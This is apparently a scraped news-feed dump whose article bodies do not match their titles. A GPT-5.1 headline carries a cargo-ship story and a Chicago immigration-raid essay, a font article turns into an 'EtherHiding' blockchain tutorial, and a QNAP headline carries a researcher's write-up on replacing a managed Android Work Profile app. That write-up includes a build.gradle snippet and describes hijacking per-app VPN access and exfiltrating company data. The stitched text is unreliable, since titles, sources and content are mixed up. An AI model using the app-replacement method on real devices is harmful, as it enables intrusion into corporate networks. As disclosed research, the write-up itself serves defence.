bend to that sort of pressure. We need to act now to prevent our most valuable companies, and their hundreds of millions of American users, from being subjected to it.These attempts to disrespect and override American sovereignty must be answered before the same thing is done to websites used by millions of other American citizens, when the UK inevitably turns its attention to the larger and more well-moderated services we all know and love, including all of our world-beating AI companies.In the final analysis, American citizens shouldn’t have to put up with this bullshit from foreigners. We fought, and won, many wars to secure our freedoms.As I have been doing for nearly an entire year, I strongly urge the White House and Congress, and legislators in each of the fifty States, to intervene to protect the free speech of all American citizens.Ofcom replied to our initial e-mail responding to their reopening this investigation (see first PDF at the bottom of this post) and this blog post as follows:This e-mail is extraordinary: Ofcom didn’t like that I referred to its enforcement effort against SaSu as a coordinated, politically motivated hit, so it felt the need – in correspondence to a target’s lawyer – to specifically respond to the allegation and complain about the public defense of my client that I made in a blog post. As to the blog post, we’ll deal with that in a second.It’s pretty obviously a true statement that this investigation has a political dimension to it. Putting aside, for a moment, the fact that a certain UK NGO – the country’s leading pro-censorship organization…kvetched to Parliament about this matter in September, called for the Prime Minister to open an investigation into my client in October, and then triggered the House of Lords’ Digital Committee to give Ofcom a written dressing-down repeating that NGO’s point of view,only last week,…it remains true that Ofcom reopened the investigation to minor but noticeable press fanfare and – miraculously! – also had that very NGO extensively quoted in a press drop that landed a mere  after I received Ofcom’s message, followed up by prime morning TV spots for that UK NGO 14 hours later (approximately 8AM local time in London) – during which time the UK NGO called for my client to be fined, arrested, and prosecuted!All for conduct that is perfectly lawful in the United States. Exhibit A:If my client’s site is truly that dangerous to UK internet users, why did Ofcom wait two days preparing a press campaign instead of, oh, I dunno, calling us up and reporting any suspected “bugs” in the geo-block so that they can be patched?Particularly when the target was voluntarily doing so ?The answer, in all probability, is that highly political pressure groups are working hand-in-glove with the UK’s public bodies, Parliament and others, to try to show that the OSA can be successfully wielded against all those pesky Americans who won’t just be sensible and surrender our rights simply because a bunch of censors in the UK ordered us to.Interesting how Ofcom treats investigations as confidential every time they get a FOIA request or a request for comment from a journalist, but not, apparently, when Parliament wants a prominent American scalp and they need to coordinate with friendly media and pro-censorship groups.Approaching the matter from this perspective, I replied to Ofcom as follows:As to the blog post, it occurred to me I forgot to clear up the record on that so I added the following:Ofcom then issued its own response, in public:Utterly extraordinary. Let me explain what probably happened here.The UK regulator has now publicly confirmed that the “mirror” site for my client’s site is not accessible in the UK. This, of course, has been the case all along, as I verified within ten minutes of receiving Ofcom’s email on Thursday afternoon. I’m not sure what, exactly, happened here, but I am advised that both mirror and the base site in this case were both covered by the IP block at all times. If I had to guess, it’s that some NGO found some UK-based IP addresses which weren’t captured by the block because they weren’t properly geolocated. They probably then assembled a dossier and reported this to the UK regulator, and the UK regulator, under pressure from its political masters in Westminster, decided to do a rush job on enforcement and drive a truck through a hole that can be measured in micrometers, betting no one would be willing to publicly defend what is, arguably, the most controversial lawful website on the planet.And the fact that Ofcom felt the need to put up a corrective press release 36 hours after the start of the reopened “investigation,” and a mere 72 hours (max) after getting a tip from the Samaritans? They’re not treating this like a law enforcement investigation, where they’d take their time and make sure they got it right.They’re definitely not treating it like a public safety matter, where they know how to reach us and know that I generally respond within the hour.  When you’re doing advance leaks to the press and rushing out statements to rebut your critics in real time, you’re not running a public safety operation. Ofcom is running a media campaign to defend the credibility of the Online Safety Act project.At the end of the day, the IP block doesn’t really matter: my client has that block up to minimize hassle from aggressive foreign regulators and to keep their spam out of its inbox, not because it has any legal obligation to give a single solitary fuck about what an unelected British bureaucrat tells it to do.Ofcom doesn’t have the legal power to order around my dog in the United States. It certainly doesn’t have the legal power to order around American citizens.I hope Washington, D.C. sees this and understands that this bullshit is what awaits every American Internet company, including Meta and X, if the United States doesn’t put a stop to this now.Ultimately, what Ofcom is doing here is the perfect modern-day teachable moment for why the First Amendment exists in the first place. A British regulator is threatening Americans in order to censor them, on pain of jail time, using only the flimsiest of excuses and immense, overbroad, and highly discretionary enforcement powers, to please politicians.America and the UK fought a war over this. UK regulators doing this to Americans for doing nothing other than lawfully exercising their constitutional rights is not a situation the United States should ever accept.I call upon the Trump Administration to use all available trade levers to put this misbehavior to an end, and upon the U.S. Congress to enact a foreign censorship shield law.]]></content:encoded></item><item><title>OpenAI plans to release GPT-5.1, GPT-5.1 Reasoning, and GPT-5.1 Pro</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/openai-plans-to-release-gpt-51-gpt-51-reasoning-and-gpt-51-pro/</link><author>Mayank Parmar</author><category>security</category><pubDate>Sat, 8 Nov 2025 22:29:44 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[OpenAI is preparing the GPT-5.1 family for public rollout.

The company’s CEO, Jean Zanuttini, said the crossing was a valuable experience in handling large sail surfaces across the North Atlantic, especially during late-season storms. He added that despite the difficulties, the ship showed strong resilience by reaching its destination with only a short delay in Saint Pierre.The Neoliner Origin is designed to reduce greenhouse gas emissions by 80 to 90 per cent compared to conventional diesel-powered cargo ships. According to the United Nations Conference on Trade and Development (UNCTAD), global shipping produces about 3 per cent of worldwide greenhouse gas emissions.Zanuttini said the company aims to balance industrial needs with environmental responsibility. He added that wind propulsion offers an advantage because it is a free, widely available, and predictable energy source that does not harm ecosystems.The UK’s National Clean Maritime Research Hub has reported that wind propulsion systems like those on the Neoliner Origin can cut emissions by over 50 per cent on new vessels optimised for wind conditions. Retrofitted vessels can also achieve reductions of 5 to 20 per cent, and up to 30 per cent when adjusted for wind conditions.The Neoliner Origin was designed by the French naval engineering firm Mauric. The company’s CEO, Vincent Seguin, said the goal was to develop a ship that relies primarily on wind propulsion while ensuring consistent delivery schedules and efficient operation with a smaller crew.Inspired by historic sailing vessels, the Neoliner Origin integrates modern systems such as advanced navigation, anti-drift mechanisms, and automated sail management to comply with current safety and operational standards.The ship can carry up to 5,300 tonnes of cargo, including containers, vehicles, machinery, and specialised goods. It arrived in Baltimore carrying Renault vehicles, French liqueurs, machinery, and other products.The Neoliner Origin is scheduled to make monthly voyages between Europe and North America, maintaining a commercial cruising speed of around 11 knots.⚓️ Enhance Your Knowledge.

It is a neighborhood group: four people were
kidnapped at the corner drugstore. A friend a mile away sends a Slack message:
she was at the scene when masked men assaulted and abducted two people on the
street. A plumber working on my pipes is distraught, and I find out that two of his
employees were kidnapped that morning. A week later it happens again.An email arrives. Agents with guns have chased a teacher into the school where she
works. They did not have a warrant. They dragged her away, ignoring her and her colleagues’ pleas to show proof of her documentation. That evening I stand a few feet from the parents of Rayito de Sol and listen to them describe, with anguish, how good
Ms. Diana was to their children. What it is like to have strangers with guns
traumatize your
kids.
For a teacher to hide a three-year-old child for fear they might be
killed.
How their relatives will no longer leave the house. I hear the pain and fury in
their voices, and I wonder who will be next.Understand what it is to sleep in Chicago. On the night of September
30th,
federal agents rappelled from a Black Hawk helicopter to execute a raid on an apartment
building on the South Shore. Roughly three hundred agents deployed flashbangs,
busted down doors, and took people indiscriminately. US citizens, including
women and children, were grabbed from their beds, marched outside without even
a chance to dress, zip-tied, and loaded into
vans. Residents returned to find
their windows and doors broken and their belongings
stolen.Understand what it is to lead Chicago. On October 3rd, Alderperson Jesse Fuentes asked federal agents to produce a judicial warrant and allow an injured man at the hospital access to an attorney. The plainclothes agents grabbed Fuentes, handcuffed her, and took her outside the building. Her lawsuit is ongoing. On October 21st, Representative Hoan Huynh was going door-to-door to inform businesses of their immigration rights when he was attacked by six armed CBP agents, who boxed in his vehicle and pointed a gun at his face. Huynh says the agents tried to bash open his car window.Understand what it is to live in Chicago. On October 9th, Judge Ellis issued a temporary restraining
order
requiring that federal agents refrain from deploying tear gas or shooting
civilians without an imminent threat, and requiring two audible warnings. ICE
and CBP have flouted these court orders. On October 12th, federal agents
shoved an attorney to the
ground
who tried to help a man being detained in Albany Park. Agents refused to
identify themselves or produce a warrant, then deployed tear gas without
warning. On October 14th, agents rammed a car on the East Side, then
tear-gassed neighbors and
police.On October 23rd, federal agents detained seven
people,
including two U.S. citizens and an asylum seeker, in Little Village. Two worked
for Alderperson Michael Rodriguez: his chief of staff Elianne Bahena, and
police district council member Jacqueline Lopez. Again in Little Village, agents tear-gassed and pepper-sprayed protestors, seizing two high school students and a security guard, among others. Alderperson Byron Sigcho-Lopez reported that agents assaulted one of the students, who had blood on his face. On October 24th, agents in
Lakeview emerged from unmarked cars, climbed a locked fence to enter a
private yard, and kidnapped a construction
worker.
As neighbors gathered, they deployed four tear gas canisters. That same day, a few blocks away,
men with rifles jumped out of SUVs and assaulted a man standing at a bus
stop.“They were beating him,” said neighbor Hannah Safter. “His face was bleeding”.They returned minutes later and attacked again. A man from the Laugh Factory, a
local comedy club, had come outside with his mother and sister. “His mom put
her body in between them, and one of the agents kicked her in the face”.“Kids dressed in Halloween costumes walking to a parade do not pose an immediate threat to the safety of a law enforcement officer. They just don’t. And you can’t use riot control weapons against them,” Judge Ellis said to Border Patrol chief Gregory Bovino.Understand how the government speaks about Chicago. On November 3rd, paralegal Dayanne Figueroa, a US citizen, was driving to work when federal agents crashed into her car, drew their guns, and dragged her from the vehicle. Her car was left behind, coffee still in the cup holder, keys still in the car. The Department of Homeland Security blamed her, claiming she “violently resisted arrest, injuring two officers.” You can watch the video for yourself.“I find the government’s evidence to be simply not credible,” said Judge Ellis in her November 6th ruling. “The use of force shocks the conscience.”Understand what it is to be Chicago. To carry a whistle and have the ICIRR hotline in your phone. To wake up from nightmares of shouting militiamen and guns in your face. To rehearse every day how to calmly refuse entry, how to identify a judicial warrant, how to film and narrate an assault. To wake to helicopters buzzing your home, to feel your heart rate spike at the car horns your neighbors use to alert each other to ICE and CBP enforcement. To know that perhaps three thousand of your fellow Chicagoans have been disappeared by the government, but no one really knows for sure. To know that many of those seized were imprisoned a few miles away, as many as a hundred and fifty people in a cell, denied access to food, water, sanitation, and legal representation. To know that many of these agents—masked, without badge numbers or body cams, and refusing to identify themselves—will never face justice. To wonder what they tell their children.The masked thugs who attack my neighbors, who point guns at elected officials and shoot pastors with pepper balls, who tear-gas neighborhoods, terrify children, and drag teachers and alderpeople away in handcuffs are not unprecedented. We knew this was coming a year ago, when Trump promised mass deportations. We knew it was coming, and seventy-seven million of us voted for it anyway.This weight presses on me every day. I am flooded with stories. There are so many I cannot remember them all; cannot keep straight who was gassed, beaten, abducted, or shot. I write to leave a record, to stare at the track of the tornado. I write to leave a warning. I write to call for help.I want you to understand, regardless of your politics, the historical danger of a secret police. What happens when a militia is deployed in our neighborhoods and against our own people. Left unchecked their mandate will grow; the boundaries of acceptable identity and speech will shrink. I want you to think about elections in this future. I want you to understand that every issue you care about—any hope of participatory democracy—is downstream of this.I want you to understand Chicago.This essay has been building—eating at me, really—for the last two months. My thanks to all the friends, family, neighbors and colleagues who have talked with me about ICE and CBP. In particular, I want to acknowledge the families of Rayito de Sol—parents like Maria Guzman and Tara Goodarzi, whose powerful speeches have been lodged in my chest. Also the members of One Northside, Aldermen Vasquez and Martin, Senator Simmons, and everyone who spoke at the rally Wednesday. Your call to “tell the story” caught me, and I hope I have done some small part of that work here.ICE and CBP affect us all: south, east, north and west; city and suburb. In particular, ICE has hit Little Village, a predominantly Latino neighborhood on the Southwest Side, hard in recent weeks. Marginalized communities especially deserve our focus and care.You can donate your time and money to organizations like ICIRR, which connects immigrants and refugees with legal aid and social services. I also suggest a donation to the non-profit Block Club Chicago or Chicago Sun-Times, both of whom have been doing exceptional local journalism in this dark time. Without their reporting, this would have been impossible.]]></content:encoded></item><item><title>Avería: The Average Font (2011)</title><link>http://iotic.com/averia/</link><author>JoshTriplett</author><category>dev</category><pubDate>Sat, 8 Nov 2025 19:29:44 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[ of a new font,

put the idea to the back of my mind until it occurred to me that perhaps the process of
averaging, or interpolating, existing fonts might bring up interesting results. Luckily at this
point I didn't do any more web searching – instead I grabbed
my laptop and came up with an initial idea for finding what the average of all
my fonts might look like – by overlaying each letter at low opacity. The results
can be seen in the below image.This was done by printing each letter of each font, at the same point size,
to lots of separate images, and then averaging them – using ImageMagick and PHP.
The letters were
aligned to the same centre point. I later realised that each font has a ‘baseline’ defined, and
an origin on that baseline which each glyph is drawn relative to. The same process,
repeated with equal origins, gives slightly different results (see below) – here
you can see the baseline is very well-defined, with the glyphs becoming more blurred towards the top right of each.I was quite pleased with the results. It was only later that I discovered
this had already been done – though it appeared that my end results (whilst not as beautifully animated) had a little
more clarity, so I'm glad I tried for myself. But this didn't seem like the end of
the journey. Whilst this was an  interesting experiment, and showed an lot of
correlation between a sample of common fonts (as well as a
couple of oddities – notably the lower case ‘g’ which clearly exists in two
distinct common forms), what I really wanted was an average which somehow
preserved the well-defined edges of existing fonts. So I started considering ways to
produce a smoother, sharper average of letter forms.One idea which seemed obvious was to simply take the blurry results of the
first experiment, and use a threshold to create monochrome images. A few experiments in this
direction (I first tried with a lower-case ‘f’, which I later found was never
likely to give good results due to the variance in height of the middle
cross-stroke) convinced me that I needed to look into cleverer ways to achieve
this.
Surely there must be a simple way to average shapes, while keeping the result as a
shape?It turns out not to be straightforward. There are manypossibleways to ‘morph’ between two shapes – and what might seem the most natural
generally depends on our perception of ‘features’ in the shapes. Consider the
average of a capital I with serifs, and one without: the natural thing to do
would be something like, make the serifs half as big, and use a horizontal stem
width about half-way between the two glyphs. That's two feature concepts being
applied to the abstract forms¹. To take a simpler example, what is the
average of a square with the same square rotated 45˚? There are a few
possibilities …So, this stumped me for a while. I decided I needed to get to know fonts
better, so I built a simple web app to view the lines, curves and control points
present in the fonts I had. On this basis, I started to consider the ways the
features (vertices, curves, stems, serifs etc) might be matched up between fonts.
However, this was a rabbit hole I might never get to the bottom of -
particularly when considering some of the more unusual varieties of font.
Perhaps there was a simpler idea that was evading me.Then it occurred to me: since my aim was to average a large number of fonts,
perhaps it would be best to use a very simple process, and hope the results
averaged out well over a large number of fonts. So, how about splitting each 
letter perimeter into lots of (say, 500) equally-spaced points, and just average
between the corresponding positions of each, on each letter? It would be necessary to match up the points so
they were about the same location in each letter, and then the process would be
fairly simple².Having found a simple process to use, I was ready to start. And after about a month of
part-time slaving away (sheer fun! Better than any computer game) – in the
process of which I learned lots about bezier curves and font metrics – I had a
result. I call it Avería – which is a Spanish word related to the root of the
word ‘average’. It actually means mechanical breakdown or damage. This seemed curiously fitting, and I was
assured by a Spanish friend-of-a-friend that “Avería is an incredibly beautiful
word regardless of its meaning”. So that's nice.Along the way I naturally called on the counsel of the best designers
I know – my brother Nick Sayers, Lloyd Thomas, Tom Muller and
Chris McGrail, for
advice. In the end, I decided to release the font using the SIL Open Font
License – which means anyone can use it pretty much however they like – and to
include within the family Regular, Bold and Light variants with Italics. Each is
made from the corresponding subsets of the fonts on my machine. Also
included is a “” version made from all my fonts (725 in total).Avería Family (ZIP, 369kB) [Updated 9 Nov 2011]

Any misuse of the information contained here is solely the responsibility of the end user.To demonstrate Etherhiding, we will create a smart contract that returns the string:Onhexgroup: Hi from BlockChainWe will also build a simple HTML page where a user can click a button to fetch that string from the blockchain and display it on the page.To implement this project we will follow several steps:You can download the project’s source code from GitHub, and I’ve also uploaded a YouTube video where you can watch the full implementation process step-by-step.Step 1: Installing the MetaMask ExtensionMetaMask is a cryptocurrency wallet and at the same time, a gateway to the Ethereum blockchain.Simply put, it’s a tool that allows users to interact with decentralized applications (DApps) built on Ethereum and other compatible networks such as BSC (Binance Smart Chain), Polygon, Avalanche, and more.To deploy our smart contract on a blockchain, we first need to have MetaMask installed.For this tutorial, we’ll use the browser extension version of MetaMask.Since I’m using Firefox, I’ll install the MetaMask extension on my Firefox browser.After installation, you’ll need to create a new account in MetaMask.If you already have an existing wallet, you can simply use that instead.Step 2: Adding the Sepolia Test Network to MetaMaskIn blockchains like Ethereum, every transaction on the main network (Mainnet) requires a fee, because users must pay gas fees using real cryptocurrency (such as ETH).However, developers usually don’t want to spend real money while testing or developing decentralized applications (DApps).That’s why test networks (Testnets) exist — they provide environments similar to the mainnet, but without real currency.Sepolia is one of Ethereum’s official test networks that we can use for development and testing purposes.To add the Sepolia test network in MetaMask:Click on the menu icon (three lines) at the top of MetaMask.Enable the option “Show test networks.”Once that’s done, MetaMask will be able to interact with the Sepolia test network, allowing you to deploy and test smart contracts safely.Step 3: Adding Some Free ETH to MetaMaskAs mentioned above, the whole point of using the Sepolia testnet is to avoid real cost — i.e., we still consume “ETH” for gas, but not real money from our pocket.In blockchain terminology, a faucet is a service that dispenses small amounts of cryptocurrency (usually on testnets) to users so they can test transactions or smart contracts without paying with real funds. Faucets are primarily meant for education, testing and development. To avoid abuse, most faucets only release a small amount of tokens at fixed intervals (for example, once every 24 hours).Ethereum Sepolia faucets are services that give you a small amount of test ETH on the Sepolia network. With that test ETH you can: deploy a smart contract to the testnet, send transactions, experiment with gas costs, and generally simulate network behavior without real expense.There are several providers and methods to obtain Sepolia test ETH — for example QuickNode and Alchemy provide faucet-like flows — but some of these services impose limits or requirements (for instance: needing a minimal balance in your account previously, or requiring you to have used the wallet before). These restrictions are there to reduce bot abuse.In my own search I found a service that easily transferred 0.05 Sepolia ETH to my MetaMask wallet. To use such a service, select Ethereum Sepolia as the network and paste your MetaMask wallet address into the faucet’s address field.To view the received amount, go to the Activity section and switch the network from Ethereum Mainnet to Sepolia.To do this, click on Ethereum Mainnet, select Custom, and then enable Sepolia.Alright — now we have enough test ETH to cover the deployment gas for our smart contract.Step 4: Developing the Smart ContractA smart contract is a program that runs on a blockchain and automatically enforces the rules and conditions of an agreement — without the need for intermediaries like banks or lawyers.Simply put, a smart contract is like an automated robot on the blockchain: once certain predefined conditions are met, it executes the specified actions on its own.In our case, we want to create a smart contract that, when called, returns the string: “onhexgroup: Hi from BlockChain”Since a smart contract is essentially a program, we need both a programming language and a development environment.We’ll use Solidity as the programming language and Remix IDE as our development environment.Remix provides a web-based environment similar to VS Code, making it simple and convenient to write, compile, and deploy smart contracts directly from the browser.Open the contracts folder in Remix.Delete all existing files inside that folder.Create a new file named ethhidedemo.sol.Inside that file, paste the following Solidity code:We define a string variable named message that stores the text “Onhexgroup: Hi from BlockChain”.We then define a public function getMessaage() that simply returns the value of message.Step 5: Compiling the Smart Contract CodeJust like in traditional programming languages such as C, a smart contract must be compiled before it can be executed.To compile our smart contract, go to the fourth option in the left sidebar menu of Remix (number 1 in the image).Once inside the Compile section , use the dropdown (number 2) to select the compiler version — we’ll keep the default version.Finally, click on “Compile ethhidedemo.sol” (number 3 in the image) to compile the code and generate the bytecode.If you see a green check mark, it means the compilation was successful.Step 6: Copying the Smart Contract ABIWhen a smart contract is written in a language like Solidity and deployed to the blockchain, its code is converted into bytecode — which is not human-readable.To be able to interact with that contract later (for example, using web3.js, ethers.js, or MetaMask), we need to know:What inputs and outputs they expect, andWhat data types are used.All this information is stored in a structure called the ABI (Application Binary Interface).To obtain the ABI of our contract:Scroll down to the bottom of the Compile section in Remix.There, you’ll find a block of code in JSON format — this is your contract’s ABI.Copy that JSON code and save it somewhere, as we’ll need it later to connect our web application to the contract.Step 7: Deploying the Smart ContractAfter developing and compiling our smart contract, the next step is to deploy it on a blockchain network.As mentioned earlier, we’ll use the Sepolia Test Network for this purpose.To deploy the contract, open the “Deploy & Run Transactions” tab — which is the fifth option in the Remix sidebar.Description of the interface (based on the image):Opens the Deploy & Run Transactions panel.Specifies the deployment and testing environment.Displays your Wallet account.Shows the smart contract you want to deploy.The Deploy button — used to deploy the smart contract.Displays the address of the deployed contract.Since we want to deploy the contract to the Sepolia test network and pay the deployment gas fee using MetaMask, go to the Environment dropdown and select:Browser extension → Injected Provider — MetaMaskAfter selecting this option and connecting MetaMask to Remix, your MetaMask wallet address will appear in the Account field.Next, under Contract, choose the smart contract you created earlier,and finally click on Deploy to deploy it to the Sepolia network — the transaction fee will be automatically deducted from your test ETH.If everything goes well, you’ll see the deployed contract address appear under the Deployed Contracts section.So far, we have developed and deployed our smart contract on the blockchain. To interact with this smart contract, we need an interface. In practice, this interface:Receives requests from our website or application,Forwards the requests to the blockchain,Collects the response, andSends the result back to the website.For this purpose, we will use the Infura RPC service.RPC (Remote Procedure Call) is a method used in blockchain to allow applications (like Remix or MetaMask) to communicate remotely with a node on the blockchain network.Simply put, RPC is a remote request to execute a command on the blockchain. For example, when we click Deploy in Remix, we are actually sending a request via RPC to deploy the contract on the blockchain.We will use INFURA as our RPC provider. To do this:Sign up on the Infura website and select the Free plan.The Free plan will generate an API Key for you.Click on the API Key and go to Active Endpoints to view your available RPC URLs.You will see several links for different networks. The one we are looking for is Ethereum Sepolia.Step 9: Developing the Web InterfaceAt this point, we have most of the puzzle pieces:The only remaining part is to develop a web page to interact with the smart contract.Create a file named index.html. Paste the following code inside the file:Important: Replace the placeholders with your own values:YOUR_CONTRACT_ADDRESS_HERE → Smart contract addressYOUR_ABI_HERE → ABI JSON of your contractYOUR_INFURA_RPC_URL_HERE → Infura Sepolia RPC endpointThis simple web page allows users to click a button and fetch the message from the smart contract deployed on the blockchain.Step 10: Running the ProjectFinally, everything is ready to run our project.To avoid issues like Content Security Policies (CSP) when opening the HTML file directly in the browser, we’ll run a local server using Python.If you don’t have Python, you can also use alternatives like Live Server in VS Code, Node.js HTTP Server, or similar tools.Open a terminal in the project folder and run:python -m http.server 8000This will start a local web server on port 8000.Open your browser and go to:You should see your web page loaded.When you click the “Read Message” button, the page will fetch the message from the smart contract via the Infura RPC and display it on the screen.]]></content:encoded></item><item><title>Seven QNAP Zero-Day Vulnerabilities Exploited at Pwn2Own 2025 Now Patched</title><link>https://cybersecuritynews.com/qnap-zero-day-vulnerabilities-exploited/</link><author></author><category>security</category><pubDate>Sat, 8 Nov 2025 14:03:20 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

			Due to a auto-install requirement in the Work Profile, which can be enforced via Intune, it is possible to convince the Play Store service (Finsky) to install an arbitrary app, with the same package name and a higher version number than the managed legit application. If a per-app VPN connection is configured via MS Tunnels and Defender application for the managed application, it is even possible to take over the VPN connection and have access to the internal systems.In June 2023, i had the chance to do some testing and research with Microsoft Intune and Android Enterprise in a (bring-your-own-device) BYOD scenario. Microsoft Intune is a cloud-based service that provides unified endpoint management, allowing organizations to manage and secure devices, applications, and data across various platforms, including Windows, macOS, iOS, and Android. Android Enterprise is a set of APIs and tools from Google that enables organizations to manage and secure Android devices for business use, allowing for the separation of work and personal data on a single device and providing granular control over apps and settings. The basic idea is to give the employees the opportunity to have business related apps with internal data on their phones, but in a secure way.During the analysis, we tested several vectors like if sharing data between private and work apps is enabled / possible, are screenshots enabled and stuff like that. We also noticed that some apps were required and auto downloaded due to company policies. Of course, this is all extremely dependant on the configuration of the respective policies pushed to the devices. Some not-so-interesting-compliance-checks-days later, we thought maybe it is possible to install arbitrary apps via ADB CLI. Since it is was private device (BYOD), the employee can activate the Developer Options options very easy.As we already knew, Android has multi user support and this is especially relevant for Work Profiles. Whenever a Work Profile is created on a device, an additional user is created with his own filesystem and relevant apps. This usually looks like this on a regular phone: main user is  and the Android Enterprise Work Profile user could be  (depending how many Work Profiles / other profiles were already created). This brings the advantage that the filesystem, system apps and everything relevant is absolutely isolated from one another. For useability and convenience reasons the Work Profile is then merged into the regular UI, as shown below: So we turned on the Developer settings and ADB on the phone tried to install an APK from our notebook via ADB CLI  and unfortunately it didnt work and was not installed. As we knew, the Work Profile has their own userid so we tried to install it via adb install --user 1 test.apk but this also did not work and we got a permission error.

			I can't really remember why (i think i got the hint from a stackoverflow article :D) but i then tried it to install a pretty basic self developed app with the package name  via Android Studio, with the configuration setting . Suprisingly, this worked. We had now an arbitrary app installed with our own package name in the private and the Work Profile. We added this finding to the report and wrapped it up.A couple of weeks later, in late August 2023, i wanted to come back to this problem, because i found it pretty weird that it wasn't possible to install arbitrary apps via ADB CLI, but it worked with Android Studio. So, i thought, maybe Android Studio sends some different ADB commands over USB or something. So, i set up an Intune trial tenant, created some policies according to the ones we saw in the engagement and created test users to login via the Company portal app on my test phone. I didn’t even get to the USB debugging part, because it did not work anymore.So, i debugged other things for several hours, tried several different apps and versions and could not figure out what was different than a couple of weeks ago. By suprise, i had a look at the Android Security Bulletin from July 2023 and saw a disclosed vulnerability which looked very suspiciously like a patch for our little party trick from June and my phone for testing was of course in auto-update mode.The patch had the following description:
[RESTRICT AUTOMERGE] Prevent installing apps in policy restricted work profile using ADB

If DISALLOW_DEBUGGING_FEATURES or DISALLOW_INSTALL_APPS restrictions are
set on a work profile, prevent side loading of APKs using ADB in the work profile.

			When i had closer look at the code, i wondered if it would be possible to install (update) an arbitrary app with the same package name as an already installed one. So i recreated the environment i had seen in June 2023, configured the Intune policies and added the  application to the required applications (automatic downloading and installing) of the group from my test user, because the seen environment from June 2023 also had this setting enabled. Some hours later and trying different things, i thought that it maybe should be possible to try and convince Android that my arbitrary app with the same package name as an already installed app, could be an update when the version number is higher than the actual one. 💡So i adjusted the  file of my sample app, with the assumption that the actual version name and version code of the application is  for example and the applicationId, namespace, packagename is known e.g. :
	[...]
	android {
	    namespace = "com.workday.workdroidapp"
	    compileSdk = 36

	    defaultConfig {
	        applicationId = "com.workday.workdroidapp"
	        minSdk = 31
	        targetSdk = 36
	        versionCode = 900000004
	        versionName = "9000000004.0"

	        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
	    }
	[...]
			When i checked that the setting to install for all users is still active and pressed the Debug button in Android Studio with the attached phone, i was immediatly greeted with the following notification:So i clicked  and immediatly saw the installation of my arbitrary app in the personal profile and the real Workday app, which we took the package name from for our arbitrary app, was deinstalled. I was a bit confused, because i actually thought after the error message it is not possible to update the legit app with my abitrary one and Android would just skip the installation to the Work Profile.I re-checked the company settings via Company Portal application on the phone and to my suprise, 1 minute later i saw a little notification from the Work Profile Play Store app (as i mentioned earlier, the work profile has their own set of system applications which are solely used for Work Profile stuff) that my application  has been successfully installed.At that point, i was totally confused. I repeated the steps several times, from uninstalling the work profile as a whole, reinstalling and onboarding via Company portal and then try to update the Workday app with my arbitrary one and it worked very reliable in 1-10min to replace the legit app with my arbitrary one, depending on the speed of which the policies and the missing required app (Workday) is checked and noticed on the device. I reread the patch from Android several times, and also checked the permission of the UserManager in the Work Profile, despite i just did a default configuration via Intune.So, I retested all of this in August 2025 with Android 16 (API Level 36) (Security Patch April 2025), as well as Android 13 (API Level 33) (Security Patch March 2024) and it still works. 

			
			  
			  
			  PoC with Android 13 (submitted to Android VRP with Security Patch August 2023):PoC with Android 16 (tested in August 2025 with Security Patch April 2025):So my idea why this whole chain worked was: When my arbitrary application is pushed to the device and to both users (private and work profile user) it gets installed for the private one, because there are no restrictions. For the Work Profile user, the APK gets pushed to the device into a temporary directory, then the check from the patch applies but fails because according to the usermanager object at least one of the flags DISALLOW_DEBUGGING_FEATURES or  is set for the Work Profile user and in parallel the legit app is deinstalled because it thinks it could be an update. At this point the legit app is deinstalled from the Work Profile. When then a recheck of the applied Intune policies via Company Portal is triggered, it also checks if all required apps are installed. When not, the Work Profile Play Store service (internal name Finsky) checks with Play Services online and also this temporary directory, compares the latest online version with the version in the temporary directory and if the temporary directory version is higher, then our arbitrary apps is installed. And most probably the Play Service does not check if the flags DISALLOW_DEBUGGING_FEATURES or  are set.So when i thought i had an idea why this happens and how it works, i was confident this could be a bypass for . So i opened an issue on the Google and Alphabet Vulnerability Reward Program (VRP) platform, documented everything and sent the bug report at end of August 2023.After a couple of weeks i got a response from Android VRP and with the answer that they consider this not as a vulnerability, the MDM needs to restrict this.In my opinion, the MDM does actually restrict this with the set flags (see pictures, left the private profile and right Work Profil) and the check also works, but there is most probably some sort of caching problem with the PlayStore service.Further Further Investigation - What could i do with my own app in a Work Profile?Besides the obvious, that usually sharing data between private and Work Profile is disabled, you have here a nice way to exfil data because you have now an application in the work context which you can share data to. Furthermore, there is also a setup i've seen in Intune with MS Tunnels, in which you can configure a per-app VPN. This means that a configured app on the device can connect via VPN to your network e.g. for an accounting application or internal employee directory. If you replace an application in the Work Profile with a configured per-app VPN setting with the party trick from above, it is also possible to use the VPN connection to the connected network with the arbitrary application.So of course, the prerequirements are very high, but if you're able to access someones BYOD device unlocked (Developer Settings need to be activated, otherwise you would need to know the device PIN/password to activate) you would be able to replace a legit business application with a malicous one for long-term access to company data. Additionally, if activated and if you are able to replace the correct one, you would also be able to pivot into the internal network via the per-app-VPN. To my current knowledge, the only setting that effectively mitigates this at the moment is disabling the automatic download and installation of apps (not configuring as ) in the Work Profile, but instead using available for enrolled devices setting. Other policies, such as disabling Developer Settings for all profiles or blocking installations from unknown sources, can be easily bypassed with proper timing. It it also questionable if employees would accept such a restriction on their private phone and in their private profile. Nonetheless the company tries to save money with not providing a dedicated work device and piggybacks the private ones.Let me know if you have additional ideas, then please ping me or let me know on X (https://x.com/joelgun)]]></content:encoded></item><item><title>NCCIA arrests man over massive data breach involving millions of Pakistanis</title><link>https://databreaches.net/2025/11/08/nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis/?pk_campaign=feed&amp;pk_kwd=nccia-arrests-man-over-massive-data-breach-involving-millions-of-pakistanis</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 13:01:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Defense Contractors Are Silencing Their Cybersecurity Watchdogs</title><link>https://databreaches.net/2025/11/08/defense-contractors-are-silencing-their-cybersecurity-watchdogs/?pk_campaign=feed&amp;pk_kwd=defense-contractors-are-silencing-their-cybersecurity-watchdogs</link><author>Dissent</author><category>databreach</category><pubDate>Sat, 8 Nov 2025 12:53:23 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Hackers Hijack Samsung Galaxy Phones via 0-Day Exploit Using a Single 